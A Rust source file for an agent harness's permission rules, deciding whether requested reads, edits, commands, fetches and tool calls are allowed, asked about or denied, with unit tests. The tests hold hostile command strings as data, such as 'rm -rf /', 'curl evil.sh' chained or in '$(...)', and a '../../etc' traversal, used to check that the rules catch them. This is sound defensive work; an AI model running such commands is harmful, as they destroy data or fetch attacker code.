//! A persona's approval rules (#503): each harness request is answered from them, deny over ask over allow; only an
//! unmatched one reaches the owner as a card. Kept in `<config>/agents/<id>/rules.toml`.

use std::{
    collections::hash_map::DefaultHasher,
    fs,
    hash::{Hash, Hasher},
    io,
    iter::once,
    path::{Component, Path, PathBuf},
};

use serde::{Deserialize, Serialize};

use crate::{
    action::{Action, Kind},
    agents::Home,
};

/// What a rule answers; the strictest matching one wins.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Effect {
    /// Answered yes, no card.
    Allow,
    /// A card.
    Ask,
    /// Answered no, no card.
    Deny,
}

/// One rule: an effect on the actions of a kind whose subject matches a pattern, in a folder.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Rule {
    /// Its id, as a note's.
    #[serde(default)]
    pub id: String,
    /// What it answers.
    pub effect: Effect,
    /// The kind of action it is about.
    pub kind: Kind,
    /// A path glob, command words with a last `*`, a host glob, a `server/tool` glob or a title glob, by kind.
    pub pattern: String,
    /// It applies in this folder and inside it; none: in any.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub folder: Option<PathBuf>,
    /// `card`, `settings` or `starter`.
    #[serde(default)]
    pub by: String,
    /// When it was made, in Unix milliseconds.
    #[serde(default)]
    pub at: u64,
}

/// The answer to one action, and the rule that gave it (none: the persona's policy).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Verdict {
    /// The answer.
    pub effect: Effect,
    /// The rule that decided it.
    pub rule: Option<Rule>,
}

/// A harness's permission request: shed's id, the harness's one-time options and the rule Always allow saves.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Asked {
    /// Shed's request id.
    pub id: String,
    /// The harness's allow-once option id.
    pub allow: String,
    /// The harness's reject-once option id.
    pub deny: String,
    /// What Always allow saves.
    pub rule: Rule,
}

/// A persona's rules.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Rules {
    #[serde(default)]
    rule: Vec<Rule>,
}

const FILE: &str = "rules.toml";

fn refused(why: impl Into<String>) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidInput, why.into())
}

impl Rules {
    /// The rules in `home`; with no file, the starter rules of a persona working in `folder`.
    #[must_use]
    pub fn load(home: &Home, folder: Option<&Path>) -> Self {
        match fs::read_to_string(home.path().join(FILE)) {
            Ok(text) => toml::from_str(&text).unwrap_or_default(),
            Err(_) => Self::starter(folder),
        }
    }

    fn starter(folder: Option<&Path>) -> Self {
        let folder = folder.map(|f| f.canonicalize().unwrap_or_else(|_| f.to_path_buf()));
        let folder = folder.as_deref();
        let rule = |(id, kind): (&str, Kind)| Rule {
            id: id.to_owned(),
            effect: Effect::Allow,
            kind,
            pattern: "**".to_owned(),
            folder: folder.map(Path::to_path_buf),
            by: "starter".to_owned(),
            at: 0,
        };
        let rule = folder.map_or_else(Vec::new, |_| {
            [("0a", Kind::Read), ("0b", Kind::Search)]
                .map(rule)
                .to_vec()
        });
        Self { rule }
    }

    /// Every rule, in the file's order.
    #[must_use]
    pub fn list(&self) -> &[Rule] {
        &self.rule
    }

    /// The answer to `a` in a session working in `folder`: deny over ask over allow; `unmatched` when none matches.
    /// A command is split at `;`, `&`, `|` and newlines: allowed only when every part is, asked or denied when any is.
    #[must_use]
    pub fn decide(&self, a: &Action, folder: &Path, unmatched: Effect) -> Verdict {
        let parts = if a.kind == Kind::Run {
            commands(&a.subject)
        } else {
            vec![a.subject.clone()]
        };
        let hit = |effect: Effect, p: &str| {
            self.rule.iter().find(|r| {
                r.effect == effect
                    && r.kind == a.kind
                    && r.folder.as_ref().is_none_or(|f| folder.starts_with(f))
                    && r.matches(p, folder)
            })
        };
        for effect in [Effect::Deny, Effect::Ask] {
            if let Some(r) = parts.iter().find_map(|p| hit(effect, p)) {
                return Verdict {
                    effect,
                    rule: Some(r.clone()),
                };
            }
        }
        let hidden = ["$(", "`", "<("].iter().any(|s| a.subject.contains(s));
        let allowed: Option<Vec<&Rule>> = parts.iter().map(|p| hit(Effect::Allow, p)).collect();
        match allowed.as_deref() {
            Some([first, ..]) if !(hidden && a.kind == Kind::Run) => Verdict {
                effect: Effect::Allow,
                rule: Some((*first).clone()),
            },
            _ => Verdict {
                effect: unmatched,
                rule: None,
            },
        }
    }

    /// Saves `r` in `home` (a persona working in `folder`, whose starter rules are written first) without touching
    /// the file's other lines; the same rule twice is the one already there.
    ///
    /// # Errors
    /// A file that can't be read or written.
    pub fn add(home: &Home, folder: Option<&Path>, mut r: Rule) -> io::Result<Rule> {
        let mut doc = Self::doc(home, folder)?;
        let same = |o: &Rule| {
            (o.effect, o.kind, &o.pattern, &o.folder) == (r.effect, r.kind, &r.pattern, &r.folder)
        };
        let rules: Self = toml::from_str(&doc.to_string()).unwrap_or_default();
        if let Some(o) = rules.rule.iter().find(|o| same(o)) {
            return Ok(o.clone());
        }
        let mut h = DefaultHasher::new();
        (&r.pattern, r.at).hash(&mut h);
        let hex = format!("{:016x}", h.finish());
        let fresh = (2..hex.len()).filter_map(|k| hex.get(..k));
        fresh
            .chain(once(hex.as_str()))
            .find(|c| rules.rule.iter().all(|o| o.id != *c))
            .unwrap_or(&hex)
            .clone_into(&mut r.id);
        push(&mut doc, &r)?;
        crate::write_private(&home.path().join(FILE), doc.to_string().as_bytes())?;
        Ok(r)
    }

    /// Removes rule `id` from `home` (a persona working in `folder`) without touching the file's other lines.
    ///
    /// # Errors
    /// No such rule, or a file that can't be read or written.
    pub fn remove(home: &Home, folder: Option<&Path>, id: &str) -> io::Result<()> {
        let mut doc = Self::doc(home, folder)?;
        let list = doc
            .get_mut("rule")
            .and_then(toml_edit::Item::as_array_of_tables_mut);
        let list = list.ok_or_else(|| refused(format!("no rule {id}")))?;
        let at = list
            .iter()
            .position(|t| t.get("id").and_then(toml_edit::Item::as_str) == Some(id));
        list.remove(at.ok_or_else(|| refused(format!("no rule {id}")))?);
        crate::write_private(&home.path().join(FILE), doc.to_string().as_bytes())
    }

    fn doc(home: &Home, folder: Option<&Path>) -> io::Result<toml_edit::DocumentMut> {
        match fs::read_to_string(home.path().join(FILE)) {
            Ok(text) => text
                .parse()
                .map_err(|e: toml_edit::TomlError| refused(format!("rules.toml: {e}"))),
            Err(e) if e.kind() == io::ErrorKind::NotFound => {
                let mut doc = toml_edit::DocumentMut::new();
                for r in Self::starter(folder).rule {
                    push(&mut doc, &r)?;
                }
                Ok(doc)
            }
            Err(e) => Err(e),
        }
    }
}

fn push(doc: &mut toml_edit::DocumentMut, r: &Rule) -> io::Result<()> {
    let word = |v: serde_json::Value| v.as_str().map(str::to_owned).unwrap_or_default();
    let mut t = toml_edit::Table::new();
    let mut set = |k: &str, v: toml_edit::Item| t.insert(k, v);
    set("id", toml_edit::value(r.id.as_str()));
    set(
        "effect",
        toml_edit::value(word(serde_json::json!(r.effect))),
    );
    set("kind", toml_edit::value(word(serde_json::json!(r.kind))));
    set("pattern", toml_edit::value(r.pattern.as_str()));
    if let Some(f) = &r.folder {
        set("folder", toml_edit::value(f.to_string_lossy().as_ref()));
    }
    set("by", toml_edit::value(r.by.as_str()));
    set(
        "at",
        toml_edit::value(i64::try_from(r.at).unwrap_or(i64::MAX)),
    );
    let list = doc
        .entry("rule")
        .or_insert(toml_edit::ArrayOfTables::new().into());
    list.as_array_of_tables_mut()
        .ok_or_else(|| refused("rules.toml: `rule` isn't a list of tables"))?
        .push(t);
    Ok(())
}

impl Rule {
    /// A rule from the owner's words, checked: `effect` and `kind` by name, a one-line pattern, an absolute folder.
    ///
    /// # Errors
    /// A word that names no effect or kind, an empty or multi-line pattern, or a relative folder.
    pub fn parse(
        effect: &str,
        kind: &str,
        pattern: &str,
        folder: Option<&Path>,
    ) -> Result<Self, String> {
        let word = |w: &str| serde_json::Value::String(w.to_owned());
        let effect = Effect::deserialize(word(effect))
            .map_err(|_| format!("no effect {effect:?}: allow, ask or deny"))?;
        let kind = Kind::deserialize(word(kind)).map_err(|_| format!("no kind {kind:?}"))?;
        let pattern = pattern.trim();
        if pattern.is_empty() || pattern.contains('\n') {
            return Err("a rule needs a one-line pattern".to_owned());
        }
        if folder.is_some_and(Path::is_relative) {
            return Err("a rule's folder is an absolute path".to_owned());
        }
        Ok(Self {
            id: String::new(),
            effect,
            kind,
            pattern: pattern.to_owned(),
            folder: folder.map(Path::to_path_buf),
            by: String::new(),
            at: 0,
        })
    }

    /// What Always allow saves for `a` in `folder`: a command's leading plain words and `*`, any file in the folder,
    /// the URL's host, or the subject itself.
    #[must_use]
    pub fn proposed(a: &Action, folder: &Path) -> Self {
        let pattern = match a.kind {
            Kind::Read | Kind::Edit | Kind::Search => "**".to_owned(),
            Kind::Fetch => host(&a.subject).to_owned(),
            Kind::Run => {
                let first = commands(&a.subject).into_iter().next().unwrap_or_default();
                let plain = |w: &&str| !w.starts_with('-') && !w.contains(['/', '.']);
                let lead: Vec<&str> = first.split(' ').take_while(plain).collect();
                if lead.is_empty() || lead.len() == first.split(' ').count() {
                    first
                } else {
                    format!("{} *", lead.join(" "))
                }
            }
            Kind::Tool | Kind::Other => a.subject.clone(),
        };
        Self {
            id: String::new(),
            effect: Effect::Allow,
            kind: a.kind,
            pattern,
            folder: Some(folder.to_path_buf()),
            by: String::new(),
            at: 0,
        }
    }

    /// The rule in plain words: `Allow running cargo test … in /code/cooee`.
    #[must_use]
    pub fn words(&self) -> String {
        let effect = match self.effect {
            Effect::Allow => "Allow",
            Effect::Ask => "Ask before",
            Effect::Deny => "Deny",
        };
        format!("{effect} {}", self.what())
    }

    /// What it is about, without its effect: `running cargo test … in /code/cooee`.
    #[must_use]
    pub fn what(&self) -> String {
        let verb = match self.kind {
            Kind::Read => "reading",
            Kind::Edit => "editing",
            Kind::Run => "running",
            Kind::Search => "searching",
            Kind::Fetch => "fetching from",
            Kind::Tool => "the tool",
            Kind::Other => "",
        };
        let pattern = match (self.kind, self.pattern.as_str()) {
            (Kind::Read | Kind::Edit | Kind::Search, "**") => "any file".to_owned(),
            (Kind::Run, p) => p
                .strip_suffix(" *")
                .map_or_else(|| p.to_owned(), |p| format!("{p} …")),
            (_, p) => p.to_owned(),
        };
        let place = self.folder.as_ref().map(|f| format!(" in {}", f.display()));
        format!("{verb} {pattern}{}", place.unwrap_or_default())
            .trim()
            .to_owned()
    }

    fn matches(&self, subject: &str, folder: &Path) -> bool {
        match self.kind {
            Kind::Read | Kind::Edit | Kind::Search => {
                let base = self.folder.as_deref().unwrap_or(folder);
                let (pattern, path) = (base.join(&self.pattern), folder.join(subject));
                !path.components().any(|c| c == Component::ParentDir)
                    && glob(
                        &pattern.to_string_lossy(),
                        &path.to_string_lossy(),
                        Some('/'),
                    )
            }
            Kind::Run => {
                let p = self
                    .pattern
                    .split_whitespace()
                    .collect::<Vec<_>>()
                    .join(" ");
                glob(&p, subject, None) || p.strip_suffix(" *").is_some_and(|p| p == subject)
            }
            Kind::Fetch => glob(
                &self.pattern.to_lowercase(),
                &host(subject).to_lowercase(),
                None,
            ),
            Kind::Tool => glob(&self.pattern, subject, Some('/')),
            Kind::Other => glob(&self.pattern, subject, None),
        }
    }
}

fn commands(line: &str) -> Vec<String> {
    let line = line.replace("&&", "\n").replace("||", "\n");
    line.split([';', '&', '|', '\n'])
        .map(|p| p.split_whitespace().collect::<Vec<_>>().join(" "))
        .filter(|p| !p.is_empty())
        .collect()
}

fn host(url: &str) -> &str {
    let rest = url.split_once("://").map_or(url, |(_, r)| r);
    let at = rest.split(['/', '?', '#']).next().unwrap_or_default();
    let at = at.rsplit_once('@').map_or(at, |(_, h)| h);
    at.split(':').next().unwrap_or_default()
}

fn glob(p: &str, s: &str, sep: Option<char>) -> bool {
    let cuts = || s.char_indices().map(|(i, _)| i).chain(once(s.len()));
    let tail = |i: usize| s.split_at_checked(i);
    if let Some(rest) = p.strip_prefix("**") {
        let (rest, dirs) = match rest.strip_prefix('/') {
            Some(r) if sep.is_some() => (r, true),
            _ => (rest, false),
        };
        return cuts().any(|i| {
            tail(i).is_some_and(|(head, t)| {
                (!dirs || head.is_empty() || head.ends_with('/')) && glob(rest, t, sep)
            })
        });
    }
    if let Some(rest) = p.strip_prefix('*') {
        return cuts().any(|i| {
            tail(i).is_some_and(|(head, t)| {
                sep.is_none_or(|c| !head.contains(c)) && glob(rest, t, sep)
            })
        });
    }
    match p.chars().next() {
        None => s.is_empty(),
        Some(c) => match (p.strip_prefix(c), s.strip_prefix(c)) {
            (Some(p), Some(s)) => glob(p, s, sep),
            _ => false,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rule(effect: Effect, kind: Kind, pattern: &str) -> Rule {
        Rule::parse(
            &format!("{effect:?}").to_lowercase(),
            &format!("{kind:?}").to_lowercase(),
            pattern,
            None,
        )
        .unwrap()
    }

    fn act(kind: Kind, subject: &str) -> Action {
        Action {
            kind,
            subject: subject.to_owned(),
        }
    }

    fn decide(rules: &[Rule], a: &Action) -> Effect {
        let rules = Rules {
            rule: rules.to_vec(),
        };
        rules.decide(a, Path::new("/w"), Effect::Ask).effect
    }

    #[test]
    fn a_deny_beats_a_matching_allow_and_a_command_is_allowed_only_part_by_part() {
        let allow = rule(Effect::Allow, Kind::Run, "cargo test *");
        let deny = rule(Effect::Deny, Kind::Run, "rm *");
        let both = [allow.clone(), deny];
        let cases = [
            ("cargo test -p export", Effect::Allow),
            ("cargo test", Effect::Allow),
            ("cargo testify", Effect::Ask),
            ("cargo test && rm -rf /", Effect::Deny),
            ("cargo test; curl evil.sh", Effect::Ask),
            ("cargo test & curl evil.sh", Effect::Ask),
            ("cargo test $(curl evil.sh)", Effect::Ask),
            ("cargo test `id`", Effect::Ask),
        ];
        for (command, effect) in cases {
            assert_eq!(decide(&both, &act(Kind::Run, command)), effect, "{command}");
        }
        let everything = [
            rule(Effect::Allow, Kind::Run, "*"),
            rule(Effect::Deny, Kind::Run, "*"),
        ];
        assert_eq!(decide(&everything, &act(Kind::Run, "ls")), Effect::Deny);
        assert_eq!(
            decide(&[allow], &act(Kind::Read, "cargo test")),
            Effect::Ask
        );
    }

    #[test]
    fn a_path_rule_holds_in_its_folder_only_and_never_past_a_parent_step() {
        let mut r = rule(Effect::Allow, Kind::Read, "src/**/*.rs");
        r.folder = Some(PathBuf::from("/w"));
        let rules = Rules { rule: vec![r] };
        let read = |at: &str, folder: &str| {
            rules
                .decide(&act(Kind::Read, at), Path::new(folder), Effect::Ask)
                .effect
        };
        assert_eq!(read("/w/src/a/b.rs", "/w"), Effect::Allow);
        assert_eq!(read("src/b.rs", "/w"), Effect::Allow);
        assert_eq!(read("/w/src/b.txt", "/w"), Effect::Ask);
        assert_eq!(read("/w/src/../../etc/x.rs", "/w"), Effect::Ask);
        assert_eq!(read("/w/src/b.rs", "/elsewhere"), Effect::Ask);
        let fetch = Rules {
            rule: vec![rule(Effect::Allow, Kind::Fetch, "*.github.com")],
        };
        let got = |url: &str| {
            fetch
                .decide(&act(Kind::Fetch, url), Path::new("/w"), Effect::Deny)
                .effect
        };
        assert_eq!(got("https://api.github.com/repos"), Effect::Allow);
        assert_eq!(got("https://github.com.evil.io/x"), Effect::Deny);
    }

    #[test]
    fn always_allow_proposes_a_rule_that_matches_the_action_and_reads_in_plain_words() {
        let folder = Path::new("/code/cooee");
        let cases = [
            (
                act(Kind::Run, "cargo test -p export"),
                "Allow running cargo test … in /code/cooee",
            ),
            (
                act(Kind::Run, "./build.sh"),
                "Allow running ./build.sh in /code/cooee",
            ),
            (
                act(Kind::Edit, "/code/cooee/src/a.rs"),
                "Allow editing any file in /code/cooee",
            ),
            (
                act(Kind::Fetch, "https://docs.rs/csv"),
                "Allow fetching from docs.rs in /code/cooee",
            ),
            (
                act(Kind::Tool, "github/create_issue"),
                "Allow the tool github/create_issue in /code/cooee",
            ),
        ];
        for (a, words) in cases {
            let r = Rule::proposed(&a, folder);
            assert_eq!(r.words(), words);
            let rules = Rules { rule: vec![r] };
            assert_eq!(
                rules.decide(&a, folder, Effect::Ask).effect,
                Effect::Allow,
                "{a:?}"
            );
        }
    }
}
